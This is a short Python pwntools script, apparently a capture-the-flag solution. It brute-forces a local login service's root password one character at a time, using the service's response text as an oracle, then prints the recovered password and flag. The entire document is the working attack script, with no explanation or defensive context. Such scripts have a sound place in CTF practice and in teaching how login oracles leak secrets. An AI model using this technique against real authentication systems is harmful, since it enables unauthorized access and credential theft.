from pwn import*

passwd = ""
flag = ""
for i in range(0,32):
	for j in range(0x20,0x80):
		#io = process("./login")
		io = remote("127.0.0.1",40001)
		io.recvuntil("Username: ")
		io.sendline("root")
		io.recvuntil("Password: ")
		io.sendline(passwd + chr(j))
		x = io.recvline()
		if "How can you login successful as root!" in x:
			passwd += chr(j)
			if i == 31:
				io.recvuntil("This is your flag: ")
				flag = io.recvline()
			io.close()
			break;
		
		else:
			io.close()

print "flag: " + flag
print "passwd: " + passwd
